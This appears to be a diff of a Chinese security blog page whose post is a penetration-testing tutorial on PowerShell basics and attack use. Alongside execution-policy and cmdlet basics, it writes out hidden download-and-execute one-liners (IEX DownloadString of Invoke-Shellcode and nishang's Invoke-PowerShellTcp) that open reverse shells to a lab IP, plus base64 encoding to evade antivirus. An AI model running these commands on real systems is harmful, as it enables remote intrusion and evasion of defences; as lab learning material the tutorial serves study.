+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-07-05 00:00:00" itemprop="dateCreated datePublished" datetime="2020-07-05T00:00:00+08:00">2020-07-05</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-07-16 19:28:14" itemprop="dateModified" datetime="2020-07-16T19:28:14+08:00">2020-07-16</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="powershell-te-dian" id="powershell特点">powershell特点</h3>
+<p>1、win7以上默认安装<br>
+2、脚本可在内存中运行，不需要写入磁盘<br>
+3、几乎不会触发杀软<br>
+4、可远程执行</p>
+<a id="more"></a>
+<p>5、很多工具都是基于powershell开发<br>
+6、cmd.exe的运行通常会被阻止，但是powershell的运行不会<br>
+7、可用于管理活动目录(AD)<br>
+输入&quot;Get-Host&quot;或&quot;$PSVersionTable.PSVERSION&quot;查看powershell版本<br>
+<img src="/imgss/a19.png" alt=""><br>
+操作系统对应的powershell版本表<br>
+<img src="/imgss/a18.png" alt=""></p>
+<h3 id="ji-ben-gai-nian" id="基本概念">基本概念</h3>
+<p>1、 .ps1文件<br>
+powershell脚本扩展名为&quot;.ps1&quot;<br>
+2、 执行策略<br>
+为防止使用者执行恶意脚本，powershell提供了执行策略，可使用如下命令进行查询<br>
+Get-ExecutionPolicy<br>
+Restricted：脚本不能运行(默认为此选项)<br>
+RemoteSigned：在本地创建的脚本可以运行，但从网上下载的脚本不能运行(有数字证书签名的除外)<br>
+ALLSigned：仅当前脚本由受信任的发布者签名时才能运行<br>
+Unrestricted：允许所有脚本运行<br>
+通过set-ExecutionPolicy+策略选项进行设置其他策略(需管理员权限)<br>
+<img src="/imgss/a20.png" alt=""><br>
+3、管道<br>
+各个管道符的含义<br>
+<img src="/imgss/a28.png" alt=""><br>
+PS：linux没有单个and符(&amp;)，&amp;符在linux中表示在后台运行，所以linux中用;分号，其它三个符号都相同<br>
+举例：get-process p* | stop-process<br>
+表示让所有正在运行、并且名字为p开头的程序，停止运行</p>
+<h3 id="chang-yong-ming-ling" id="常用命令">常用命令</h3>
+<p>新建目录：New-Item susu -type Directory<br>
+新建文件：New-Item test.txt -type File<br>
+删除目录：Remove-Item 文件或目录<br>
+显示文本内容：Get-Content test.txt<br>
+设置文本内容：Set-Content test.txt -Value “Hello,word!”<br>
+追加内容：Add-Content 1.txt -Value “fuck you”<br>
+清楚内容：Clear-Content test.txt<br>
+<img src="/imgss/a29.png" alt=""></p>
+<p>1、绕过本地文件权限并执行<br>
+将powerup.ps1上传到目标机，在命令行环境下，执行如下命令，绕过安全策略<br>
+powershell.exe -ExecutionPlicy Bypass -File powerup.ps1<br>
+或powershell.exe -exec bypass -Command “&amp; {import-module C:\powerup.ps1; invoke-AllChecks}”</p>
+<p>2、从公网下载脚本，绕过本地权限并隐藏执行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -Exec Bypass -W Hidden -NoP -NonI &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;cheetz&#x2F;PowerSploit&#x2F;master&#x2F;CodeExecution&#x2F;Invoke--Shellcode.ps1&#39;)&quot;;Invoke-Shellcode -Payload windows&#x2F;meterpreter&#x2F;reverse_https -Lhost 192.168.37.132 -Lport 4399</span><br></pre></td></tr></table></figure></div>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1">https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1</a><br>
+或https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1<br>
+参数说明：<br>
+-ExecutionPolicy Bypass(-Exec Bypass)：绕过安全策略，很多情况安全策略规定powershell不能运行命令和文件<br>
+-windowStyle Hidden(-W Hidden)：隐藏窗口<br>
+NonInteractive(-NonI)：非交互式模式，powershell不为用户提供交互式的提示<br>
+NoProfile(-NoP)：powershell控制台不加载当前用户的配置文件<br>
+-noexit：执行后不退出shell。在使用键盘记录等脚本时非常重要<br>
+-nologo：启动时不显示版权标志的powershell</p>
+<p>PS：图中我是先将公网上的ps1脚本下载下来，然后部署到kali上实验的，而且我未开启-W Hidden隐藏窗口！<br>
+(感觉Invoke–Shellcode.ps1脚本有问题，没有成功反弹shell，成功的大佬联系我，呜呜呜，现在建议用nisahng的Invoke-PowerShellTcp.ps1，测试-W Hidden之后是正常反弹shell的)</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反弹shell语句写在脚本最后一行</span><br><span class="line">Invoke-PowerShellTcp -Reverse -IPAddress 192.168.37.132 -Port 4399</span><br><span class="line">目标机执行命令如下</span><br><span class="line">PowerShell.exe -Exec Bypass -W Hidden -NoP -NonI &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.37.132:8080&#x2F;Invoke-PowerShellTcp.ps1&#39;)&quot;;.\Invoke-PowerShellTcp.ps1</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/a30.png" alt=""></p>
+<p>3、使用base64对powershell命令编码(经测试会被win10自带杀软干掉)</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.37.132:8080&#x2F;Invoke--Shellcode.ps1&#39;);Invoke-Shellcode -Payload windows&#x2F;meterpreter&#x2F;reverse_https -Lhost 192.168.37.132 -Lport 4399 -Force&quot; &gt;raw.txt</span><br></pre></td></tr></table></figure></div>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py">https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py</a><br>
+chmod a+x ps_encoder.py<br>
+./ps_encoder.py -s raw.txt<br>
+之后目标机执行如下命令即可</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powershell.exe -Nop -NonI -W Hidden -Exec Bypass -enc &quot;base64代码&quot;</span><br></pre></td></tr></table></figure></div>
+<p>4、运行32位和64位powershell<br>
+在64位操作系统中，有x64和x86两个版本powershell，他们互不影响，可以当成独立得两个程序</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">运行32位脚本命令：</span><br><span class="line">powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br><span class="line">运行64位脚本命令：</span><br><span class="line">%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure></div>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="tag"># 基础知识</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/07/04/WIFI%E5%AE%89%E5%85%A8/" rel="prev" title="">
+                  <i class="fa fa-chevron-left"></i> 
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/07/14/%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9%E6%8F%90%E6%9D%83%E4%B8%8EUAC%E7%BB%95%E8%BF%87/" rel="next" title="'组策略首选项提权与UAC绕过'">
+                  '组策略首选项提权与UAC绕过' <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
 
 <div class="copyright">
-  
   &copy; 
-  <span itemprop="copyrightYear">2021</span>
+  <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
-    <i class="fa fa-user"></i>
+    <i class="fa fa-heart"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">素念</span>
+  <span class="author" itemprop="copyrightHolder">zer0_c|imb</span>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v5.2.0
-  </div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.1
-  </div>
-
-    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-        
 <div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
       <span class="post-meta-item-icon">
         <i class="fa fa-user"></i>
       </span>
@@ -483,8 +440,7 @@
         <span id="busuanzi_value_site_uv"></span>
       </span>
     </span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
       <span class="post-meta-item-icon">
         <i class="fa fa-eye"></i>
       </span>
@@ -493,59 +449,30 @@
       </span>
     </span>
 </div>
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
 
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/pisces.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
+    </div>
+  </footer>
 
   
-
-
-
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
 
   
-<script src="/js/local-search.js"></script>
-
-
-
-
-
-
-
-
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
 
 
 
 
 
   
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
-  
+
+
+
 
 </body>
 </html>
